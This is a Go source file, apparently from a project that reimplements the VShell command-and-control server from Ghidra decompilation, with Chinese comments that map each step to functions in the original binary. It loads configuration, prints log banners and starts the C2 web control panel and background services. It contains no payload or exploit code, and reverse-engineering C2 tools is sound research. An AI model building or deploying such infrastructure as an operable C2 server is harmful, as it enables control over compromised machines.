// Package main 是 VShell C2 服务器的入口，1:1 对齐原版二进制 main.main
//（Ghidra FUN_0194b320 @ 0x194b320，经 runtime.main 计算调用进入）。
//
// 原版启动流程（逐分支反编译还原）：
//  1. 加载配置 conf/setting.conf（FUN_00dacf20；"setting.conf" 字符串由
//     FUN_0194e520 解密还原）；失败 → 输出 "load config file error"（XOR 解密
//     字符串已还原）并退出。
//  2. 读取 log_level 配置键（9 字节字符串已还原）初始化日志器（DAT_1e42f1a0）。
//  3. 读取 6 字节配置键 "master"（FUN_0194e700，待引擎阶段确认）：
//     - master_type != "service" → 控制台横幅：拼接 "console" + 配置串 +
//       ",\"color\":true}"（FUN_0194ee40 还原的 JSON 片段），经日志器输出；
//     - 否则 → Web 模式横幅（FUN_0194e7e0 / FUN_0194e8c0 / FUN_0194eb40
//       解密的长横幅文本）。
//  4. 启动应用对象（FUN_01944a00 → 接口方法表 +0x28 = Start）。
//  5. 启动后台服务（FUN_0194f080 / FUN_0194bf60）。
//  6. 阻塞等待（FUN_0047d440/FUN_0047d5c0 = runtime chan 接收）。
package main

import (
	"fmt"
	"net/http"
	"os"

	"vshell/controllers"
	"vshell/router"
	"vshell/utils"
)

// loadConfig 加载 conf/setting.conf（原版 FUN_00dacf20；失败时输出
// "load config file error" 并退出）。
func loadConfig() *utils.FullSettings {
	cfg := utils.GetFullSettings()
	if cfg == nil {
		fmt.Println("load config file error")
		os.Exit(1)
	}
	return cfg
}

// consoleBanner 控制台模式横幅（master_type != "service"）：
// 反编译还原：FUN_0194ece0 = `{"level":`（9 字符），FUN_0194ee40 = `,"color":true}`；
// 中间为 log_level 配置值；经日志器以键 "console" 输出。
func consoleBanner(cfg *utils.FullSettings) {
	fmt.Printf("console %s\n", fmt.Sprintf(`{"level":%d,"color":true}`, cfg.LogLevel))
}

// webBanner 文件模式横幅（master_type == "service"）：
// 反编译还原：FUN_0194e7e0 = `{"level":`，FUN_0194e8c0 = `,"filename":"`，
// FUN_0194eb40 = `,"daily":false,"maxlines":100000,"color":true}`（47 字符，
// garble 解密已还原）；经日志器以键 "file"（DAT_01bd7c6d）输出。
func webBanner(cfg *utils.FullSettings) {
	fmt.Printf("file %s\n", fmt.Sprintf(
		`{"level":%d,"filename":"%s","daily":false,"maxlines":100000,"color":true}`,
		cfg.LogLevel, cfg.LogPath))
}

// main 按原版流程启动 C2 服务端。
func main() {
	cfg := loadConfig()

	// log_level：初始化日志器（原版读取该配置键后设置日志级别）
	_ = cfg.LogLevel

	// master_type 分支（原版与 "service" 比较：非 service → 控制台横幅）
	switch cfg.MasterType {
	case "service":
		webBanner(cfg)
	default:
		consoleBanner(cfg)
	}

	// 启动应用对象（引擎阶段：对齐 FUN_01944a00 接口 Start 方法）
	if err := controllers.AppStart(cfg); err != nil {
		fmt.Printf("start app: %v\n", err)
		os.Exit(1)
	}

	// 启动 Web 面板（原版由引擎 Start 内部启动，此处先行挂载路由）
	h := router.InitRouter()
	addr := fmt.Sprintf("%s:%d", cfg.WebIP, cfg.WebPort)
	go func() {
		if cfg.WebOpenSSL && cfg.WebCertFile != "" && cfg.WebKeyFile != "" {
			_ = http.ListenAndServeTLS(addr, cfg.WebCertFile, cfg.WebKeyFile, h)
		} else {
			_ = http.ListenAndServe(addr, h)
		}
	}()

	// 后台服务（引擎阶段：对齐 FUN_0194f080 / FUN_0194bf60）
	controllers.AppBackground()

	// 阻塞等待（原版 runtime chan 接收）
	select {}
}
